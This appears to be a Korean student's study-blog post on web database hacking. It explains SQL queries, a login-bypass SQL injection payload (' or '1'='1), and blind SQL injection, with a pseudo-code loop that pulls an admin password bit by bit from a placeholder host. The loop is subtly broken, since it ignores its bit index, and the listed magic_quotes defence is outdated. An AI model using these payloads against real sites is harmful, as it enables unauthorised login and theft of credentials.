---
title: "[모각코]해킹맛보기(웹해킹 마무리)"
excerpt_separator: "<!--more-->"
toc: true
toc_sticky: true
categories:
  - 모각코
tags:
  - 모각코
  - Hacking
---

## 07-24 토요일

## 데이터베이스 해킹

- 웹 언어별 일반적 DBMS 선택

  | 웹 언어 |  DBMS  |        공통 특징         |
  | :-----: | :----: | :----------------------: |
  |   PHP   | MySQL  |         오픈소스         |
  |   JSP   | Oracle |     오라클 사의 제품     |
  |   ASP   | MS-SQL | 마이크로소프트 사의 제품 |

### 공격에 필요한 구문

SQL Injection을 위해서는 각 DBMS 구문에 대해 알아야 함

간단한 SQL 삽입 - "SELECT {칼럼} FROM {테이블} WHERE {조건}"

- 웹 페이지의 회원 기능을 제작하기 위해 쓰이는 구문

  - 회원 가입 - INSERT문
  - 회원정보 수정 - UPDATE문
  - 로그인 - SELECT문
  - 회원 탈퇴 - DELETE문

- 로그인 쿼리

```
#쿼리는 아래와 같이 작성될 수 있음
select idx from member where id='입력아이디' and password='입력패스워드'
- Member 테이블에서 id가 '입력아이디'이고 password가 '입력패스워드'인 결과의 idx 칼럼 출력
```

- 이용자 추가

```
insert into member(id, password, name) values('입력아이디', '입력패스워드', '입력이름');
- Member 테이블에 '입력아이디', '입력패스워드', '입력이름' 값을 추가
```

- 회원정보 수정

```
update member set password='새로운 패스워드' where id='hellsonic'
- Member 테이블에 id가 hellsonic 인 경우 패스워드를 '새로운 패스워드'로 변경
```

- 회원 탈퇴

```
delete from member where id='hellsonic'
- Member 테이블에 id가 hellsonic인 경우 Row를 삭제
```

### 공격

사용자의 입력값은 대개 WHERE 조건절에 들어가게 되므로 Integer 형식이라면  
''값 없이 그냥 입력되지만, String 형식인 경우 '나 "사이에 문자열 값이 들어가게 되므로  
문자열 입력값에 삽입해 쿼리를 새로 작성할 수 있음

```
SELECT id FROM member WHERE id='admin' and password='' or '1'='1'
```

다음과 같은 쿼리를 삽입할 경우 모든 Row가 리턴되며 admin 아이디로 로그인 됨

![mysql 삽입 cheat sheet (2)](https://user-images.githubusercontent.com/66258691/126854980-f778c9c7-7954-48fb-a09a-c17d097a4a4b.jpg){: width="50%" height=50%"}

- **Blind SQL**

쿼리 결과의 참/거짓 정보만으로 데이터를 추출해내는 기법

"ABC" 에서 A를 추출해 내기 위해서 다음과 같은 과정 필요
A를 10진수로 변환, 그 값을 2진수로 변환 후 lpad 함수를 통해 8바이트로 맞춤
따라서 A라는 한 바이트의 문자열을 뽑기 위해서는 여덟 번의 쿼리가 실행되어야 함

```
select substr(lpad(bin(ord(substr("ABC",1,1))), 8, 0),1 ,1);
select substr(lpad(bin(ord(substr("ABC",1,1))), 8, 0),2 ,1);
select substr(lpad(bin(ord(substr("ABC",1,1))), 8, 0),3 ,1);
...
select substr(lpad(bin(ord(substr("ABC",1,1))), 8, 0),8 ,1);
01000001 -> "A"
```

하지만 이러한 과정은 매우 비효율적이므로 간단한 코딩을 통해 빠르게 데이터 추출 가능

- 코드 자동화

```js
j = 1;
stack = "";
while(1)
{
  for(i=1;i<=8;i++){
    result = get("http://x.x.x.x/target.php?id=1234&password=1' or (select substr(lpad(bin(ord(substr(password,j,1))),8,0) from member where id='admin')=1%23");
    if(result == Success){
      stack += "1";
    } else {
      stack += "0";
    }
  }
  print char(bindec(stack));
  stack = "";
  j++;
}
```

- 자동화 툴

  - pangolin
  - sqlmap
  - Havji

### 방어 기법

PHP의 경우 `magic_quotes_gpc` 라는 옵션을 통해 `' " \ null` 문자를 문자열 처리 함으로써  
SQL 삽입 공격 방어

- 참고자료
  - 해킹 맛보기
